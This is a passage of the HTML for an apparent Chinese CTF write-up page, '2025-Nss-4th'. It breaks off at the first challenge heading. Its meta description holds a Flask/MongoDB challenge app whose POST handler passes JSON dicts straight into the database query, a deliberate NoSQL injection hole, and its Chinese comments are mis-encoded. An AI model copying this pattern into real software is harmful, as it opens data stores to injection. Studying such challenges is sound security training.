<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web ez_signin è€ƒç‚¹ï¼šNosqlæ³¨å…¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 from flask import Flask, request, render_template, jsonify from pymongo import MongoClient import re # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ app = Flask(__name__) # è¿æ¥MongoDBæ•°æ®åº“ client = MongoClient(&#34;mongodb://localhost:27017/&#34;) # é€‰æ‹©aggie_bookstoreæ•°æ®åº“ db = client[&#39;aggie_bookstore&#39;] # è·å–booksé›†åˆ books_collection = db[&#39;books&#39;] # æ•°æ®æ¸…ç†å‡½æ•°ï¼Œåªä¿ç•™å­—æ¯ã€æ•°å­—å’Œç©ºæ ¼ def sanitize(input_str: str) -&gt; str: return re.sub(r&#39;[^a-zA-Z0-9\\s]&#39;, &#39;&#39;, input_str) # é¦–é¡µè·¯ç”± @app.route(&#39;/&#39;) def index(): # æ¸²æŸ“é¦–é¡µæ¨¡æ¿ï¼Œåˆå§‹ä¸æ˜¾ç¤ºä»»ä½•ä¹¦ç± return render_template(&#39;index.html&#39;, books=None) # æœç´¢è·¯ç”±ï¼Œæ”¯æŒGETå’ŒPOSTæ–¹æ³• @app.route(&#39;/search&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def search(): # åˆå§‹åŒ–æŸ¥è¯¢æ¡ä»¶ query = {&#34;$and&#34;: []} books = [] # å¤„ç†GETè¯·æ±‚ if request.method == &#39;GET&#39;: # è·å–æŸ¥è¯¢å‚æ•°å¹¶å»é™¤ä¸¤ç«¯ç©ºæ ¼ title = request.args.get(&#39;title&#39;, &#39;&#39;).strip() author = request.args.get(&#39;author&#39;, &#39;&#39;).strip() # æ¸…ç†è¾“å…¥æ•°æ® title_clean = sanitize(title) author_clean = sanitize(author) # å¦‚æœæœ‰æ ‡é¢˜æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if title_clean: query[&#34;$and&#34;].append({&#34;title&#34;: {&#34;$eq&#34;: title_clean}}) # ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰åŒ¹é… # å¦‚æœæœ‰ä½œè€…æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if author_clean: query[&#34;$and&#34;].append({&#34;author&#34;: {&#34;$eq&#34;: author_clean}}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›æ¸²æŸ“åçš„æ¨¡æ¿å’ŒæŸ¥è¯¢ç»“æœ return render_template(&#39;index.html&#39;, books=books) # å¤„ç†POSTè¯·æ±‚ elif request.method == &#39;POST&#39;: # æ£€æŸ¥Content-Typeæ˜¯å¦ä¸ºapplication/json if request.content_type == &#39;application/json&#39;: try: # å¼ºåˆ¶è§£æJSONæ•°æ® data = request.get_json(force=True) # è·å–titleå’Œauthorå‚æ•° title = data.get(&#34;title&#34;) author = data.get(&#34;author&#34;) # å¤„ç†titleå‚æ•° if isinstance(title, str): # å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ¸…ç† title = sanitize(title) query[&#34;$and&#34;].append({&#34;title&#34;: title}) elif isinstance(title, dict): # å¦‚æœæ˜¯å­—å…¸ï¼Œç›´æ¥ä½¿ç”¨ï¼ˆå¯èƒ½å­˜åœ¨NoSQLæ³¨å…¥æ¼æ´ï¼‰ query[&#34;$and&#34;].append({&#34;title&#34;: title}) # å¤„ç†authorå‚æ•° if isinstance(author, str): author = sanitize(author) query[&#34;$and&#34;].append({&#34;author&#34;: author}) elif isinstance(author, dict): query[&#34;$and&#34;].append({&#34;author&#34;: author}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›JSONæ ¼å¼çš„æŸ¥è¯¢ç»“æœ return jsonify([ { &#34;title&#34;: b.get(&#34;title&#34;), &#34;author&#34;: b.get(&#34;author&#34;), &#34;description&#34;: b.get(&#34;description&#34;) } for b in books ]) # å¦‚æœæ²¡æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œè¿”å›é”™è¯¯ return jsonify({&#34;error&#34;: &#34;Empty query&#34;}), 400 except Exception as e: # å¤„ç†å¼‚å¸¸æƒ…å†µ return jsonify({&#34;error&#34;: str(e)}), 500 # ä¸æ”¯æŒçš„Content-Type return jsonify({&#34;error&#34;: &#34;Unsupported Content-Type&#34;}), 400 # å¯åŠ¨Flaskåº”ç”¨ if __name__ == &#34;__main__&#34;: app.run(&#34;0.0.0.0&#34;, 8000) # ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£çš„8000ç«¯å£ å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œ\n">
<title>2025-Nss-4th</title>

<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-nss-4th/'>

<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-Nss-4th">
<meta property='og:description' content=" web ez_signin è€ƒç‚¹ï¼šNosqlæ³¨å…¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 from flask import Flask, request, render_template, jsonify from pymongo import MongoClient import re # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ app = Flask(__name__) # è¿æ¥MongoDBæ•°æ®åº“ client = MongoClient(&#34;mongodb://localhost:27017/&#34;) # é€‰æ‹©aggie_bookstoreæ•°æ®åº“ db = client[&#39;aggie_bookstore&#39;] # è·å–booksé›†åˆ books_collection = db[&#39;books&#39;] # æ•°æ®æ¸…ç†å‡½æ•°ï¼Œåªä¿ç•™å­—æ¯ã€æ•°å­—å’Œç©ºæ ¼ def sanitize(input_str: str) -&gt; str: return re.sub(r&#39;[^a-zA-Z0-9\\s]&#39;, &#39;&#39;, input_str) # é¦–é¡µè·¯ç”± @app.route(&#39;/&#39;) def index(): # æ¸²æŸ“é¦–é¡µæ¨¡æ¿ï¼Œåˆå§‹ä¸æ˜¾ç¤ºä»»ä½•ä¹¦ç± return render_template(&#39;index.html&#39;, books=None) # æœç´¢è·¯ç”±ï¼Œæ”¯æŒGETå’ŒPOSTæ–¹æ³• @app.route(&#39;/search&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def search(): # åˆå§‹åŒ–æŸ¥è¯¢æ¡ä»¶ query = {&#34;$and&#34;: []} books = [] # å¤„ç†GETè¯·æ±‚ if request.method == &#39;GET&#39;: # è·å–æŸ¥è¯¢å‚æ•°å¹¶å»é™¤ä¸¤ç«¯ç©ºæ ¼ title = request.args.get(&#39;title&#39;, &#39;&#39;).strip() author = request.args.get(&#39;author&#39;, &#39;&#39;).strip() # æ¸…ç†è¾“å…¥æ•°æ® title_clean = sanitize(title) author_clean = sanitize(author) # å¦‚æœæœ‰æ ‡é¢˜æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if title_clean: query[&#34;$and&#34;].append({&#34;title&#34;: {&#34;$eq&#34;: title_clean}}) # ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰åŒ¹é… # å¦‚æœæœ‰ä½œè€…æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if author_clean: query[&#34;$and&#34;].append({&#34;author&#34;: {&#34;$eq&#34;: author_clean}}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›æ¸²æŸ“åçš„æ¨¡æ¿å’ŒæŸ¥è¯¢ç»“æœ return render_template(&#39;index.html&#39;, books=books) # å¤„ç†POSTè¯·æ±‚ elif request.method == &#39;POST&#39;: # æ£€æŸ¥Content-Typeæ˜¯å¦ä¸ºapplication/json if request.content_type == &#39;application/json&#39;: try: # å¼ºåˆ¶è§£æJSONæ•°æ® data = request.get_json(force=True) # è·å–titleå’Œauthorå‚æ•° title = data.get(&#34;title&#34;) author = data.get(&#34;author&#34;) # å¤„ç†titleå‚æ•° if isinstance(title, str): # å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ¸…ç† title = sanitize(title) query[&#34;$and&#34;].append({&#34;title&#34;: title}) elif isinstance(title, dict): # å¦‚æœæ˜¯å­—å…¸ï¼Œç›´æ¥ä½¿ç”¨ï¼ˆå¯èƒ½å­˜åœ¨NoSQLæ³¨å…¥æ¼æ´ï¼‰ query[&#34;$and&#34;].append({&#34;title&#34;: title}) # å¤„ç†authorå‚æ•° if isinstance(author, str): author = sanitize(author) query[&#34;$and&#34;].append({&#34;author&#34;: author}) elif isinstance(author, dict): query[&#34;$and&#34;].append({&#34;author&#34;: author}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›JSONæ ¼å¼çš„æŸ¥è¯¢ç»“æœ return jsonify([ { &#34;title&#34;: b.get(&#34;title&#34;), &#34;author&#34;: b.get(&#34;author&#34;), &#34;description&#34;: b.get(&#34;description&#34;) } for b in books ]) # å¦‚æœæ²¡æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œè¿”å›é”™è¯¯ return jsonify({&#34;error&#34;: &#34;Empty query&#34;}), 400 except Exception as e: # å¤„ç†å¼‚å¸¸æƒ…å†µ return jsonify({&#34;error&#34;: str(e)}), 500 # ä¸æ”¯æŒçš„Content-Type return jsonify({&#34;error&#34;: &#34;Unsupported Content-Type&#34;}), 400 # å¯åŠ¨Flaskåº”ç”¨ if __name__ == &#34;__main__&#34;: app.run(&#34;0.0.0.0&#34;, 8000) # ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£çš„8000ç«¯å£ å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œ\n">
<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-nss-4th/'>
<meta property='og:site_name' content='zhizuijimi'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-08-24T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-24T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="2025-Nss-4th">
<meta name="twitter:description" content=" web ez_signin è€ƒç‚¹ï¼šNosqlæ³¨å…¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 from flask import Flask, request, render_template, jsonify from pymongo import MongoClient import re # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ app = Flask(__name__) # è¿æ¥MongoDBæ•°æ®åº“ client = MongoClient(&#34;mongodb://localhost:27017/&#34;) # é€‰æ‹©aggie_bookstoreæ•°æ®åº“ db = client[&#39;aggie_bookstore&#39;] # è·å–booksé›†åˆ books_collection = db[&#39;books&#39;] # æ•°æ®æ¸…ç†å‡½æ•°ï¼Œåªä¿ç•™å­—æ¯ã€æ•°å­—å’Œç©ºæ ¼ def sanitize(input_str: str) -&gt; str: return re.sub(r&#39;[^a-zA-Z0-9\\s]&#39;, &#39;&#39;, input_str) # é¦–é¡µè·¯ç”± @app.route(&#39;/&#39;) def index(): # æ¸²æŸ“é¦–é¡µæ¨¡æ¿ï¼Œåˆå§‹ä¸æ˜¾ç¤ºä»»ä½•ä¹¦ç± return render_template(&#39;index.html&#39;, books=None) # æœç´¢è·¯ç”±ï¼Œæ”¯æŒGETå’ŒPOSTæ–¹æ³• @app.route(&#39;/search&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def search(): # åˆå§‹åŒ–æŸ¥è¯¢æ¡ä»¶ query = {&#34;$and&#34;: []} books = [] # å¤„ç†GETè¯·æ±‚ if request.method == &#39;GET&#39;: # è·å–æŸ¥è¯¢å‚æ•°å¹¶å»é™¤ä¸¤ç«¯ç©ºæ ¼ title = request.args.get(&#39;title&#39;, &#39;&#39;).strip() author = request.args.get(&#39;author&#39;, &#39;&#39;).strip() # æ¸…ç†è¾“å…¥æ•°æ® title_clean = sanitize(title) author_clean = sanitize(author) # å¦‚æœæœ‰æ ‡é¢˜æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if title_clean: query[&#34;$and&#34;].append({&#34;title&#34;: {&#34;$eq&#34;: title_clean}}) # ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰åŒ¹é… # å¦‚æœæœ‰ä½œè€…æ¡ä»¶ï¼Œæ·»åŠ åˆ°æŸ¥è¯¢ if author_clean: query[&#34;$and&#34;].append({&#34;author&#34;: {&#34;$eq&#34;: author_clean}}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›æ¸²æŸ“åçš„æ¨¡æ¿å’ŒæŸ¥è¯¢ç»“æœ return render_template(&#39;index.html&#39;, books=books) # å¤„ç†POSTè¯·æ±‚ elif request.method == &#39;POST&#39;: # æ£€æŸ¥Content-Typeæ˜¯å¦ä¸ºapplication/json if request.content_type == &#39;application/json&#39;: try: # å¼ºåˆ¶è§£æJSONæ•°æ® data = request.get_json(force=True) # è·å–titleå’Œauthorå‚æ•° title = data.get(&#34;title&#34;) author = data.get(&#34;author&#34;) # å¤„ç†titleå‚æ•° if isinstance(title, str): # å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ¸…ç† title = sanitize(title) query[&#34;$and&#34;].append({&#34;title&#34;: title}) elif isinstance(title, dict): # å¦‚æœæ˜¯å­—å…¸ï¼Œç›´æ¥ä½¿ç”¨ï¼ˆå¯èƒ½å­˜åœ¨NoSQLæ³¨å…¥æ¼æ´ï¼‰ query[&#34;$and&#34;].append({&#34;title&#34;: title}) # å¤„ç†authorå‚æ•° if isinstance(author, str): author = sanitize(author) query[&#34;$and&#34;].append({&#34;author&#34;: author}) elif isinstance(author, dict): query[&#34;$and&#34;].append({&#34;author&#34;: author}) # å¦‚æœæœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰§è¡ŒæŸ¥è¯¢ if query[&#34;$and&#34;]: books = list(books_collection.find(query)) # è¿”å›JSONæ ¼å¼çš„æŸ¥è¯¢ç»“æœ return jsonify([ { &#34;title&#34;: b.get(&#34;title&#34;), &#34;author&#34;: b.get(&#34;author&#34;), &#34;description&#34;: b.get(&#34;description&#34;) } for b in books ]) # å¦‚æœæ²¡æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œè¿”å›é”™è¯¯ return jsonify({&#34;error&#34;: &#34;Empty query&#34;}), 400 except Exception as e: # å¤„ç†å¼‚å¸¸æƒ…å†µ return jsonify({&#34;error&#34;: str(e)}), 500 # ä¸æ”¯æŒçš„Content-Type return jsonify({&#34;error&#34;: &#34;Unsupported Content-Type&#34;}), 400 # å¯åŠ¨Flaskåº”ç”¨ if __name__ == &#34;__main__&#34;: app.run(&#34;0.0.0.0&#34;, 8000) # ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£çš„8000ç«¯å£ å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œ\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’—</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
                        target="_blank"
                        title="csdn"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#ez_signin">ez_signin</a>
      <ol>
        <li><a href="#è€ƒç‚¹nosqlæ³¨å…¥">è€ƒç‚¹ï¼šNosqlæ³¨å…¥</a></li>
      </ol>
    </li>
    <li><a href="#ezcrc">EzCRC</a></li>
    <li><a href="#filesystem">filesystem</a></li>
    <li><a href="#ez_upload">ez_upload</a>
      <ol>
        <li><a href="#è€ƒç‚¹php-development-serveræºç æ³„éœ²è½¯é“¾æ¥">è€ƒç‚¹ï¼šphp development serveræºç æ³„éœ²+è½¯é“¾æ¥</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
                write.up
            </a>
        
            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
                web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025-nss-4th/">2025-Nss-4th</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-24</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 9 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<h1 id="web">web
</h1><h2 id="ez_signin">ez_signin
